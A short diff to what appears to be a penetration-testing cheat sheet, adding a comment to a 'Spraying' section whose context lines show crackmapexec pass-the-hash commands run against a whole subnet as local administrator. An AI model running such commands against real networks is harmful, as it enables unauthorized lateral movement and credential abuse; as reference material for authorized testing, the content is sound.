@@ -51,7 +51,7 @@ crackmapexec smb $IP  -u <user> -p <password>
 ## Spraying
 #### Pass the hash against a subnet
 ```bash
-
+# The LMHASH does not actually matter
 crackmapexec smb $Subnetmask -u administrator -H 'LMHASH:NTHASH' --local-auth
 crackmapexec smb $Subnetmask -u administrator -H 'NTHASH'
 ```
